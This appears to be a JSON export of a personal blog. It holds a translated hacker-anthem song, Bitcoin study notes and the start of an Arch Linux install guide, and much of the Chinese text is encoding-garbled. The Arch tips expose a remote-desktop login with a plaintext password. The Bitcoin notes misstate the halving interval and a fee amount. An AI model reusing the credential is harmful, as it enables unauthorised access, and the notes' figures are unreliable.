{"pages":[{"title":"HackStyle","text":"","link":"/HackStyle/index.html"},{"title":"Toolkit","text":"","link":"/Toolkit/index.html"}],"posts":[{"title":"ç²¾ç¡®ç¿»è¯‘é»‘å®¢èŒƒæ­Œæ›² AllTheThings","text":"å‰æ®µæ—¶é—´å›½å†…å®‰å…¨åœˆæµä¼ äº†ä¸€é¦–ã€ŠHacking Styleã€‹ï¼Œå¿½ç„¶æƒ³èµ·æ¥çœ‹é—¨ç‹— 2 é‡ŒåŒæ ·ä¹Ÿæœ‰ä¸€é¦–æ­Œè¯ç‰¹åˆ«æœ‰é»‘å®¢èŒƒå„¿çš„ Hip Hopï¼Œå«åšã€ŠAll The Thingsã€‹ç½‘æ˜“äº‘é“¾æ¥ï¼šhttp://music.163.com/song?id=32231380&amp;userid=361913487 æ­Œè¯æ”¾åœ¨è¿™ï¼ˆè¿™æ­Œç½‘æ˜“äº‘çš„æ­Œè¯åƒæ˜¯è°·æ­Œç¿»è¯‘çš„ï¼Œæ‰€ä»¥æˆ‘è¿›è¡Œäº†å¾ˆå¤šæ”¹è¿›ï¼‰ï¼š â€œNot every geek with a commodore 64 can hack into NASAâ€â€œä¸æ˜¯æ‰€æœ‰æ‹¥æœ‰ commodore64 è®¡ç®—æœºçš„é»‘å®¢éƒ½èƒ½é»‘åˆ° NASAâ€This oneâ€™s dedicated to all the hackersè¿™é¦–æ­Œæ˜¯çŒ®ç»™æ‰€æœ‰é»‘å®¢çš„ Even out settle score quickå³ä½¿å¹³å‡ç»“ç®—é€Ÿåº¦å¾ˆå¿«My disaster recovery requires even more disksæˆ‘ä¹Ÿéœ€è¦æ›´å¤šçš„ç£ç›˜æ‰èƒ½è¿›è¡Œç¾éš¾æ¢å¤â€œPut your bytes up, prove it or you forfeitâ€â€œæŠŠä½ çš„â€˜å­—èŠ‚â€™æ”¾åœ¨ä¸Šé¢ï¼Œä»è€Œè¯æ˜å®ƒæˆ–è€…ä¸§å¤±å®ƒâ€Got my C64 and we blew it into orbitâ€¦æ‹¿åˆ°äº†æˆ‘çš„ C64 è®¡ç®—æœºï¼Œæ¥ä¸‹æ¥æŠŠå®ƒé€å…¥è½¨é“â€¦ M. Bison with eight straight perfectså°±åƒæ˜¯æ‹œæ£®æ‰“äº†å…«è¿èƒœï¼ˆæ‹œæ£®ï¼Œè¡—å¤´éœ¸ç‹åæ´¾è§’è‰²ï¼‰Overload emotions make hate, break circuitsè¶…è´Ÿè·çš„æƒ…ç»ªä¼šåˆ¶é€ ä»‡æ¨ï¼Œç ´åç”µè·¯In case you heard, itâ€™s a name fake serviceå€˜è‹¥ä½ å¬è¯´äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªä¼ªé€ çš„æœåŠ¡Optimize our runtime to escape verdictsä»¥ä¼˜åŒ–æˆ‘ä»¬çš„è¿è¡Œæ—¶é—´ï¼Œé¿å…å‡ºç°é”™è¯¯Got an integer scope flowè€Œä»–ä»¬åªå¾—åˆ°ä¸€ä¸ªæ•´æ•°èŒƒå›´æµThat they canâ€™t signå´è¿˜ä¸èƒ½è¿›è¡Œç­¾åPassing code, didnâ€™t sanitizeå› ä¸ºå¯†ç é—®é¢˜ä¾ç„¶æ²¡æœ‰è¢«æ¶ˆé™¤Command lines; land mineåŒæ ·çš„è¿˜æœ‰å‘½ä»¤è¡Œå’Œâ€œåœ°é›·â€ So before, theyâ€™ll see me afteræ‰€ä»¥åœ¨æ­¤ä¹‹å‰ï¼Œä»–ä»¬ä¼šçœ‹åˆ°æˆ‘çš„å­˜åœ¨Iâ€™m Advice dogæˆ‘æ˜¯å¿ å‘Šä¹‹çŠ¬Courage Wolfå‹‡æ°”ä¹‹ç‹¼Plus PhilosoraptoråŒæ—¶ä¹Ÿæ˜¯ä¸ªå“²å­¦å®¶ Donâ€™t prove weâ€™re human unless we really haftaé™¤éæˆ‘ä»¬æ„¿æ„ï¼Œä¸ç„¶ä¸è¦è´¹åŠ›è¯æ˜æˆ‘ä»¬æ˜¯äº›æ™®é€šäººMy team built schemes that destroyed recaptchaæˆ‘çš„å›¢é˜Ÿå»ºç«‹äº†æ‘§æ¯éªŒè¯ç çš„æ–¹æ¡ˆHate what they see, finish this chapterä»–ä»¬ç—›æ¨ä»–ä»¬æ‰€çœ‹åˆ°çš„ï¼Œä»¥ä¾¿å®Œæˆè¿™ä¸ªç¯‡ç« By the way weâ€™re not any geeks, we hack into NASAé¡ºä¾¿è¯´ä¸€å¥æˆ‘ä»¬å¯ä¸æ˜¯æ™®é€šçš„é»‘å®¢ï¼Œæˆ‘ä»¬é»‘åˆ°äº† NASA Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Got this Vodka and this Redbullå–äº†è¿™ç“¶ä¼ç‰¹åŠ å…‘çº¢ç‰›They still give me wingsé†‰æ„ä¾¿èµæˆ‘åŒç¿¼So we drink all the boozeæ‰€ä»¥æˆ‘ä»¬ç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰© Zero through Threeä» 0 åˆ° 3Weâ€™re in every single ringæˆ‘ä»¬å¤„åœ¨ä»»ä½•ä¸€ä¸ªå•ç‹¬çš„ç¯èŠ‚ä¸­Iâ€™m just waiting until my blackberry diesæˆ‘åªæ˜¯åœ¨ç­‰æˆ‘çš„é»‘è“æ­»æ‰ï¼ˆé»‘è“ï¼Œæ‰‹æœºå“ç‰Œï¼‰Cause Iâ€™ll replace it with a raspberry piä¹‹åæˆ‘å°±å¯ä»¥ç”¨æ ‘è“æ´¾ä»£æ›¿äº†ï¼ˆæ ‘è“æ´¾ï¼ŒLinux å¾®å‹ç”µè„‘ï¼‰Donâ€™t compare to this trackä¸è¦å’Œè¿™ä¸ªè½¨é“æ¯”è¾ƒIt makes everything they said dullå®ƒä½¿ä»–ä»¬æ‰€è¯´ä¸€åˆ‡éƒ½ç´¢ç„¶æ— å‘³Neutralize any threatæ¶ˆé™¤ä»»ä½•å¨èƒTurn Red skull to /dev/nullå°†â€œçº¢éª·é«…â€æ”¾è¿›/dev/null ï¼ˆLinux çš„ç©ºè®¾å¤‡æ–‡ä»¶ï¼‰They killed virus writers that we mentionedä»–ä»¬æ€æ­»äº†æˆ‘ä»¬æåˆ°çš„ç—…æ¯’ä½œè€…But instead they ascended to the VXHeavenså´è‡ªå·±ç™»ä¸Šäº† VXHeavensï¼ˆçŸ¥åå…±äº«æ¶æ„è½¯ä»¶çš„ç«™ç‚¹ï¼‰To reincarnate as live wiresä»¥ä½œä¸ºæ–°é²œè¡€æ¶²å†ç”ŸStill inside we hide ciphers in signed device driversç„¶è€Œæˆ‘ä»¬ä»åœ¨è®¾å¤‡é©±åŠ¨ç¨‹åºä¸­è—äº†å¯†ç Which school will we hit next?æ¥ä¸‹æ¥æˆ‘ä»¬è¦æ”»å‡»å“ªä¸ªå­¦æ ¡ï¼ŸThey didnâ€™t learn the formatä»–ä»¬å¹¶ä¸ç†Ÿæ‚‰è¿™ç§æ ¼å¼So weâ€™ve gotta printfæ‰€ä»¥æˆ‘ä»¬å°†ä½¿ç”¨ printfï¼ˆC è¯­è¨€æ‰“å°å‡½æ•°ï¼‰Next step is a chin checkä¸‹ä¸€æ­¥è¦è¿›è¡Œçš„æ˜¯ chin checkFreestyles that I spit bestè¿™ä¾¿æ˜¯æˆ‘æœ€å–œæ¬¢çš„ FreestyleThey didnâ€™t decrypt yetä»–ä»¬ä¾ç„¶æ²¡æœ‰è§£å¯†æˆåŠŸI crush internet MCâ€™s in rhyme battlesæˆ‘å´å·²ç»æŠ¼éŸµæ–—äº‰ä¸­ç²‰ç¢äº†é‚£äº›ç½‘ç»œ MC ä»¬Get your WiFi tackledåŒæ—¶è§£å†³äº†ä½ çš„ WiFi é—®é¢˜Hak5 Pineappleç”¨çš„æ˜¯ Hak5 çš„è èæ´¾ï¼ˆä¸€ç§æ— çº¿å®¡è®¡è®¾å¤‡ï¼‰I donâ€™t think youâ€™ll like my snappleæˆ‘ä¸è®¤ä¸ºä½ ä¼šå–œæ¬¢æˆ‘çš„ snappleï¼ˆé¥®æ–™å“ç‰Œï¼‰Cause I popped it with vodkaå› ä¸ºæˆ‘åœ¨é‡Œè¾¹å…‘äº†ä¼ç‰¹åŠ And a cyanide capsuleè¿˜æœ‰ä¸€ä¸ªæ°°åŒ–ç‰©èƒ¶å›Š We drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Got this Vodka and this Redbullå–äº†è¿™ç“¶ä¼ç‰¹åŠ å…‘çº¢ç‰›They still give me wingsé†‰æ„ä¾¿èµæˆ‘åŒç¿¼So we drink all the boozeæ‰€ä»¥æˆ‘ä»¬ç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©â€œYou know this could not be security, right?â€â€œä½ çŸ¥é“è¿™æ˜¯ä¸å®‰å…¨çš„ï¼Œå¯¹å—â€First we drink all the boozeé¦–å…ˆæˆ‘ä»¬ç—›é¥®æ‰€æœ‰ç¾é…’Then we hack all the thingsç„¶åæˆ‘ä»¬é»‘å°½ä¸€åˆ‡äº‹ç‰© Then backdoor the firmwareä¹‹åå†é€šè¿‡åé—¨æ‰“å¼€å›ºä»¶On anything you bringä¸è®ºä½ ç”¨çš„æ˜¯ä»€ä¹ˆRegardless of the hardware, service, or encodingç¡¬ä»¶ã€æœåŠ¡è¿˜æ˜¯ç¼–ç Connected it to the internetåªè¦æŠŠå®ƒè¿æ¥åˆ°äº’è”ç½‘And someoneâ€™s gonna own itå°±ä¼šæœ‰äººæ‹¥æœ‰å®ƒThis is for the pirates who clapè¿™æ˜¯é€ç»™é‚£äº›é¼“æŒçš„ç›—ç‰ˆè€…And love the soundè¿˜æœ‰å–œæ¬¢è¿™æŒå£°çš„äººAttacking from the cloudæˆ‘ä»¬ä»äº‘ç«¯æ”»å‡»Then weâ€™re back in undergroundç„¶ååˆæ¥åˆ°çº¿ä¸‹Thereâ€™s no masking from us nowä»ç°åœ¨å¼€å§‹æˆ‘ä»¬ä¸å†é®æ©We pop Tor nodes around the globeæˆ‘ä»¬åœ¨å…¨çƒèŒƒå›´å†…ä½¿ç”¨äº† Tor èŠ‚ç‚¹ï¼ˆå¯éšè—è‡ªå·±èº«ä»½çš„ç½‘ç»œä»£ç†æœåŠ¡å™¨ï¼‰Track and hunt you downä»¥æ­¤å°†ä½ è¿½è¸ªå¹¶æŠ“æ•Hacked on schedule, add it to your calendarå®‰æ’å¥½é»‘å®¢æ—¥ç¨‹ï¼Œå¹¶å°†å…¶å†™åˆ°æ—¥å†ä¸ŠDevices online; here comes another challengeråœ¨åœ¨çº¿è®¾å¤‡ä¸Šï¼Œåˆæ¥äº†å¦ä¸€ä¸ªæŒ‘æˆ˜è€…State infiltrated, so undercoverè¯´ä»–ä¹Ÿå·²ç»å®Œæˆæ¸—é€ï¼Œçœ‹æ¥åŒæ ·æ˜¯ä¸ªåœ°ä¸‹é«˜æ‰‹This is for my comrades who stare at their debuggersè¿™é¦–æ­Œé€ç»™é‚£äº›ç›¯ç€è°ƒè¯•å™¨çš„åŒå¿—ä»¬ï¼ˆæŒ‡é€†å‘å·¥ç¨‹å¸ˆï¼‰And trace every bufferä»–ä»¬è¿½è¸ªæ¯ä¸ªç¼“å†²åŒºExamining the code flowæ£€æŸ¥æ¯ä¸ªç¼–ç æµâ€œHavenâ€™t been to sleep? Better pop another No-Dozâ€â€œè¿˜æ²¡æœ‰ç¡è§‰å—ï¼Ÿä¸å¦¨å†æœç”¨å¦ä¸€ç‰‡ NO-DOZ å§â€ï¼ˆæŠ—ç–²åŠ³è¯ç‰©ï¼‰I think Iâ€™ll need a planet sized urnæˆ‘æƒ³æˆ‘éœ€è¦ä¸€é¢—åœ°çƒå¤§å°çš„éª¨ç°ç›’Cause some men just wanna see the world burnå› ä¸ºæœ‰äº›äººåªæƒ³çœ‹è¿™ä¸–ç•Œç‡ƒçƒ§æ¯ç­Your turnè½®åˆ°ä½ äº† Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Got this vodka and this Redbullå–äº†è¿™ç“¶ä¼ç‰¹åŠ å…‘çº¢ç‰›They still give me wingsé†‰æ„ä¾¿èµæˆ‘åŒç¿¼So we drink all the boozeæ‰€ä»¥æˆ‘ä»¬ç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Zero through threeä» 0 åˆ° 3Weâ€™re in every single ringæˆ‘ä»¬å¤„åœ¨æ¯ä¸€ä¸ªåœ†ç¯ä¸­ Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Hack-hack-hack all the thingsé»‘-é»‘-é»‘å°½ä¸€åˆ‡äº‹ç‰©Hack-hack all the thingsç—›é¥®-é¥®-é¥®å°½æ‰€æœ‰ç¾é…’Zero through threeä» 0 åˆ° 3Weâ€™re in every single ringæˆ‘ä»¬å¤„åœ¨æ¯ä¸€ä¸ªåœ†ç¯ä¸­Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©â€œYeah weâ€™ll in good luck manâ€â€˜è€¶æˆ‘ä»¬ä¼šäº¤å¥½è¿çš„â€™Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all the thingsé»‘å°½ä¸€åˆ‡äº‹ç‰©Got this vodka and this Redbullå–äº†è¿™ç“¶ä¼ç‰¹åŠ å…‘çº¢ç‰›They still give me wingsé†‰æ„ä¾¿èµæˆ‘åŒç¿¼Drink-drink-drink all the thingsç—›é¥®-é¥®-é¥®å°½æ‰€æœ‰ä¸€åˆ‡Drink all the vodkaç—›é¥®æ‰€æœ‰ä¼ç‰¹åŠ And hack all the boozeé»‘å°½ä¸€åˆ‡ç¾é…’Drink all the boozeç—›é¥®æ‰€æœ‰ç¾é…’Hack all-Hack all the hackersé»‘å°½ä¸€åˆ‡-é»‘å°½ä¸€åˆ‡é»‘å®¢ä»¬Hack-hack-hack all the hacké»‘-é»‘-é»‘å°½ä¸€åˆ‡é»‘å®¢","link":"/2020/07/23/AllTheThings/"},{"title":"Learn the Blockchain","text":"Technical terms Word Description Cryptocurrency åŠ å¯†è´§å¸ Cryptographic Hash Function å¯†ç å“ˆå¸Œå‡½æ•° (CR)Collision Resistance å“ˆå¸Œç¢°æ’ Message Digest æ¶ˆæ¯æ‘˜è¦ Digital Commitment æ•°å­—æ‰¿è¯º Puzzle friendly Bitcionçš„æœºåˆ¶ä¹‹ä¸€ Proof of work å·¥ä½œé‡è¯æ˜ Secure Hash Algorism SHA Asymmetric encryption algorism éå¯¹ç§°åŠ å¯† Merkle Tree é»˜å…‹å°”æ ‘ Merkle Proof é»˜å…‹å°”è¯æ˜ Binary Tree äºŒå‰æ ‘ (TX)Transaction äº¤æ˜“ Root Hash æ ¹å“ˆå¸Œ Proof of inclusion/membership åŒ…å«è¯æ˜ (SPV)Simplified Payment Verification ç®€åŒ–ä»˜æ¬¾è®¤è¯ Genesis Block åˆ›ä¸–åŒºå— Full node å…¨èŠ‚ç‚¹ Light node è½»èŠ‚ç‚¹ Coinbase Transaction(Tx) é“¸å¸äº¤æ˜“ Distributed Consensus åˆ†å¸ƒå¼å…±è¯† Longest Valid Chain rule æœ€é•¿åˆæ³•é“¾åŸåˆ™ Block Reward å‡ºå—å¥–åŠ± Cryptographic Hash Function2 Features: Collision Resistance$$A \\neq\\ B$$$$H(A) = H(B)$$To avoid this situation, expanding the Value space is necessary. One solution is appending a random number After the message A, and calculating the Hash result. This feature canâ€™t be proven by math. Collision Resistance can make a message be a Message Digest, to detect the Tamper happening. 2 Features: Hiding Irreversibility: You can not get the A value if you only know the H(A) itself. The effect of Digital Sealed Envelop: Because of the hiding feature, Your message can do the forecasting stuff. The principle of Blockchainâ€™s miningTo prevent the input space too small to cause the Collision Resistance problem, each block message should add a random nouce number after itself. The miner should use the hash algorithm to calculate this random nonce number, and if the Hash result approach this situation.$$H(A+nonce) \\leq\\ Target$$This block can be put on the blockchain, And the calculation can be looked at as the Proof of Work Also, The design model of blockchain should be difficult to solve, but easy to verify Asymmetric Encryption AlgorithmEncryption process: A uses Bâ€™s public key to encode the message, and B uses its private key to decode it.Signature process: A uses its private key to encode the message, and B uses Aâ€™s public key to decode it. The Signature process was used when encapsulating a transaction(Tx) block, to prove the initiator of the transaction. The process of â€œencryptionâ€ was used when describing the number of transactions, to prove the actual transaction amount The public or private key should use a great random source to ensure its randomness. Data structure Blockchain is a linked list using a hash pointer. Blockchain uses the Merkle tree to create itself. There are two kinds of nodes to save the transaction information.Full node: Include both the Block header and the Block body.Light node: Only include the Block header(according to the SPV), like the mobile application. Every transaction should base on a theory: Who transacting, who proving When a light node wants to prove a transaction(Tx) is real, it should: Send a request to the full node, contains with the Txâ€™s hash. The full node uses the Txâ€™s hash to search the entire Merkle treeâ€™s branch and provides the Red H() to the light node. The light node uses the Red H() and combines the currently Txâ€™s Hash(Green H()) to verify the hash of the block, until to the Root hash. If the verify completely right, then the transaction can be proved right either. When a light node wants to prove a transaction(Tx) is not real, it should: Send a request to the full node, contains with the Txâ€™s hash. The full node sorts all the blocks based on their hash values and returns Txâ€™s before and after blocks hash to the light node. The light node calculates the Block Hash which combines the before and after block until to the root hash, if the root hash is the same as the current one, then this transaction is unreal(Because this transaction never exists, so the hash wasnâ€™t changed).On the contrary, if the transaction truly existed, the result of the block hash around the Tx, mustnâ€™t be the current one. ProtocolBasic TheoryAny type of token should have two sides features: Authentication of the tokenâ€™s issuerTo ensure the tokenâ€™s reality Transaction Log(Release Code, Transaction information, etcâ€¦)To ensure the token was created by the issuer, not the copying. Each transaction has two â€˜inputsâ€™ and 1 â€˜outputsâ€™: Inputs: Coinâ€™s source and Senderâ€™s public key Outputs: Receiverâ€™s public key The coinâ€™s source ensures this transactionâ€™s reality.The senderâ€™s public key ensures the sender is not fake. (But attention, this public key comes from the Coinbase Block, not the sender itself) The receiverâ€™s public key enlights this transactionâ€™s hash pointer. (transfer to whom). A block always encapsulates many transactions(Tx), all of these transactions combine into a block as a Merkle tree, and the quantity of these transactions is called the blockâ€™s height. A full node block has two parts of it: Block header, Block body The Block header was made up of these below things: Blockchain version Hash of the previous block header. (Hash pointer) Merkle tree hash target(nBits) nonce ConsensusA main feature of blockchain is [[Distributed Consensus]]In the Bitcoin system, if it wants to reach the distributed consensus, the system must consider the membership of all nodes.It can not make any decisions by the number of accounts, cause it may lead to the [[Sybil Attack]].So, using the Calculating power(By letting the miner calculate the nouce, â€œsolve the problemâ€) to measure the membership is a better way to reach consensus. Longest Valid Chain RuleThe blockchain tends to let the longest chain be the main chain.If this situation happens(like the image below): A transfers $5 to B, then A transfers the same money to the fake A(Aâ€™), it may lead to the [[Forking Attack]], but if there is another transaction after the A to B Tx, according to the longest chain rule, the attack couldnâ€™t happen. However, If two valid blocks make the chain forked, then the blockchain would choose the smaller delay one as the main chain. And the other block will be orphaned, called the Orphan block. [[Selfish Mining]] is also follow the Longest Valid Chain Rule. AchieveThis is a piece of classic block information: UTXO A full node also can do the [[UTXO]](Unspent Transaction Output) stuff. Mining Theory The Bitcoin system is always waiting for 6 confirmations to confirm a transaction(6 transactions before) is irrevocable. Miner will get the reward by mining(package the block, solve the difficulty), the reward contains two parts: Block Reward Bitcoin is secured by mining, mining is better than voting by the membership.The Bitcoin system regulates that Every 21000 blocks the block rewards be decreased by half. On average, the Bitcoin system will create a block per 10 minutes, which means 21000 blocks will cost 4 years, which means every 4 years the Block Reward will be decreased by half. Although the Block Reward is decreasing, the value of Bitcoin itself increasing year by year. So the motivation for mining is also sufficient. The Bitcoin system always adjusts the target difficulty to make the average Block time to be 10 minutes every block. Gradually, the trend will become a Geometric Series, and the total BTC is stable: 21000000 BTCIt means that there is half of BTC at least has been mined in past. Transaction FeeEach transaction always satisfies this relation:$$Total\\ Inputs \\geq Total\\ Outputs$$For example, if A wants to transfer 1 BTC to B and B can only receive 0.99 BTC, The 0.1 BTC is the Transaction Fee to pay for the miner. Mining Distribution Every mining action can seem like a [[Bernoulli Trail]], these Bernoulli Trail constitute the Bernoulli Process(A sequence of independent Bernoulli trials)The Bernoulli Trailâ€™s memoryless feature guarantees the blockchainâ€™s fairness, imagine that a node has the 10 times calculating power of another one, if the system is memorable, the advantage of the high power node will expand unlimitedly, then the weak one has no chance to defeat it ever. Because mining blocks is a low probably process, all the mining actions can seem like a [[Poisson Distribution]]. From a global perspective, every block time of a blockchain is an [[Exponential Distribution]]. If the past behavior will not affect to the futureâ€™s, it called Progress Free Guarantee the Blockchain difficulty demandBecause these years, too many miners mining the block to guarantee the Blockchain difficulty demand, causing the nonce is a 32bits non-symbolic integer, so we could adjust the Merkle root hash and time(cause the transaction no need to record a specific time) to increase the difficulty. Legality of transactionEvery transaction has Input scripts and Output scripts. When the previous transactionâ€™s Output Scripts stitch with the current transactionâ€™s Input Scripts, and the scripts successfully run, which means the current transaction is legal. NetworkThe Bitcoin system is based on the application layer in the network, and it uses P2P(Peer to Peer) Overlay Network in its network layer. Bitcoinâ€™s network is simple, and robust, but not efficient. When a node receives a message, it will â€œfloodâ€ to other neighbor nodes. (The neighbor is a logical concept, not a real geographic neighbor) The Bitcoin network follows the Best-effect Delivery standard. When a transaction wants to get into Blockchain, it will be joined into an aggregate by a node.","link":"/2022/08/14/BlockLearn/"},{"title":"Arch Linux å…¨æµç¨‹å®‰è£…çºªå®","text":"Tips:123456789101112131415161718chsh -s /bin/zshrdesktop 192.144.238.188 -u administrator -p 0Xiao4Sheng2Ye6prime-run vboxmanage startvm &quot;Win10&quot; --type guiarchlinux-java statusproxychains systemsettings5radeontopnvidia-smilspci | grep -E 'VGA|3D'HTTP_PROXY=127.0.0.1:1089HTTPS_PROXY=127.0.0.1:1089sudo balooctl disablectrl+z# å°†å½“å‰è¿›ç¨‹æ”¾åˆ°åå°æŒ‚èµ·bg# å°†æŒ‚èµ·è¿›ç¨‹æ”¾åˆ°åå°æ‰§è¡Œfg #å°†åå°æ‰§è¡Œè¿›ç¨‹æ”¾åˆ°å‰å°æ‰§è¡Œ 2021 ArchlinuxåŒç³»ç»Ÿå®‰è£…æ•™ç¨‹ï¼ˆè¶…è¯¦ç»†ï¼‰ - çŸ¥ä¹ä»¥å®˜æ–¹Wikiçš„æ–¹å¼å®‰è£…ArchLinux | viseatorâ€™s blog 0x00.å®‰è£…å‰æœŸå‡†å¤‡ å°†Archçš„é•œåƒå®‰è£…åˆ°å®‰è£…ä»‹è´¨ä¸­ ä½¿ç”¨Archå¯åŠ¨ç›˜å¼€æœºå¯åŠ¨å®‰è£…ç¨‹åº ä½¿ç”¨fdisk/cfdiskè¿›è¡Œåˆ†ç›˜å¯ä»¥ä½¿ç”¨lsblkæŸ¥çœ‹åˆ†ç›˜æƒ…å†µ 0x01.ç›¸å…³å¼•å¯¼è®¾ç½®åˆ›å»ºå¼•å¯¼åˆ†åŒº1mkfs.fat -F32 /dev/å¼•å¯¼åˆ†åŒº åˆ›å»ºæ ¹åˆ†åŒº1mkfs.ext4 /dev/æ ¹åˆ†åŒº æŒ‚è½½åˆ†åŒº12345678# åˆ›å»º/mnt/bootæ–‡ä»¶å¤¹mkdir /mnt/boot# æŒ‚è½½å¼•å¯¼åˆ†åŒºmount /dev/å¼•å¯¼åˆ†åŒº /mnt/boot# æŒ‚è½½æ ¹åˆ†åŒºmount /dev/æ ¹åˆ†åŒº /mnt 0x02.è”ç½‘è¿æ¥æ— çº¿ç½‘ç»œ ä½¿ç”¨iwctlè¿›å…¥iwdæ¨¡å¼ï¼Œå¹¶ä¾æ¬¡ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤1234567891011121314# å¯»æ‰¾å½“å‰å¯ä½¿ç”¨ç½‘å¡device list# ä½¿ç”¨ç›¸åº”ç½‘å¡è¿›è¡Œç½‘ç»œæ‰«æstation wlan0 scan# æ˜¾ç¤ºå·²ç»æ‰«æåˆ°çš„ç½‘ç»œstation wlan0 get-networks# è¿æ¥é€‰ä¸­çš„ç½‘ç»œï¼Œå¹¶è¾“å…¥å¯†ç station wlan0 connect é€‰ä¸­çš„ç½‘ç»œ# é€€å‡ºexit æ›´æ”¹ç³»ç»Ÿæ—¶é—´1timedatectl set-ntp true 0x03.å®‰è£…åŸºæœ¬ç³»ç»ŸåŠç»„ä»¶æ”¹å˜é•œåƒæº1234567891011# è¿›å…¥é•œåƒæºæ–‡ä»¶å¤¹vim /etc/pacman.d/mirrorlist# æ·»åŠ ä»¥ä¸‹é•œåƒæº# æ¸…åå¤§å­¦Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch## 163Server = http://mirrors.163.com/archlinux/$repo/os/$arch## aliyunServer = http://mirrors.aliyun.com/archlinux/$repo/os/$arch å®‰è£…åŸºæœ¬ç³»ç»Ÿ1pacstrap /mnt base base-devel linux linux-firmware dhcpcd ç”Ÿæˆè‡ªåŠ¨æŒ‚è½½åˆ†åŒºçš„æ–‡ä»¶12345# ç”Ÿæˆè‡ªåŠ¨æŒ‚è½½åˆ†åŒºçš„æ–‡ä»¶genfstab -L /mnt &gt;&gt; /mnt/etc/fstab# å¯ä»¥æŸ¥çœ‹ç¡®å®šç›¸å…³ç”Ÿæˆçš„æ–‡ä»¶cat /mnt/etc/fstab è¿›å…¥å®‰è£…çš„ç³»ç»Ÿæœ¬èº«1arch-chroot /mnt ï¼ˆå¯é€‰ï¼‰å¦‚æœå®‰è£…çš„Arch Linuxå±äºåŒç³»ç»Ÿ123456789101112131415# åœ¨å·²ç»å®‰è£…å¥½çš„ç³»ç»Ÿå†…æ‰§è¡Œ# å®‰è£…å¿…è¦çš„Bootloaderpacman -S os-prober grub efibootmgr# ç¼–è¾‘ç›¸å…³é…ç½®æ–‡ä»¶ï¼Œå¹¶å–æ¶ˆå¦‚ä¸‹å‘½ä»¤çš„æ³¨é‡Švim /etc/default/grub# GRUB_DISABLE_OS_PROBER=false# éƒ¨ç½²æ¢æµ‹å·¥å…·ï¼Œæ‰§è¡Œè¿™æ­¥å‰éœ€ç¡®å®šå¼•å¯¼åˆ†åŒºä¾æ—§è¢«æŒ‚è½½ç€# mount /dev/å¼•å¯¼åˆ†åŒº /mnt/boot è¢«æ‰§è¡Œè¿‡äº†grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Arch# éƒ¨ç½²æ¢æµ‹é…ç½®æ–‡ä»¶grub-mkconfig -o /boot/grub/grub.cfg 0x04.è¿›å…¥ç³»ç»Ÿåéœ€è¦è¿›è¡Œçš„è®¾ç½®è®¾ç½®æ—¶åŒº12ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimehwclock --systohc å®‰è£…å¿…è¦å®‰è£…çš„å®‰è£…åŒ…1pacman -S neovim dialog wpa_supplicant ntfs-3g networkmanager netctl è®¾ç½®localeè¯­è¨€é€‰é¡¹1234567891011# ç¼–è¾‘ç›¸å…³æ–‡ä»¶vim /etc/locale.gen# å»æ‰en_US zh_CNçš„å„ä¸ªutf8çš„æ³¨é‡Š# ç”Ÿæˆç›¸å…³è¯­è¨€è®¾ç½®locale-gen# åˆ›å»ºé»˜è®¤è¯­è¨€é…ç½®æ–‡ä»¶ï¼Œå¹¶å‘å…¶ä¸­å†™å…¥å¦‚ä¸‹é…ç½®vim /etc/locale.confLANG=en_US.UTF-8 æ›´æ”¹Linuxç³»ç»Ÿçš„é€šç”¨è®¾ç½®1234567891011121314151617181920# æ›´æ”¹/etc/hostnamevim /etc/hostname# æ›´æ”¹hostsæ–‡ä»¶vim /etc/hosts127.0.0.1 localhost::1 localhost127.0.1.1 myhostname.localdomain myhostname# æ›´æ”¹rootå¯†ç passwd# å»ºç«‹æ–°è´¦æˆ·ï¼Œå¹¶æ›´æ”¹æ”¹ç”¨æˆ·çš„å¯†ç useradd -m -G wheel resek4passwd resek4# 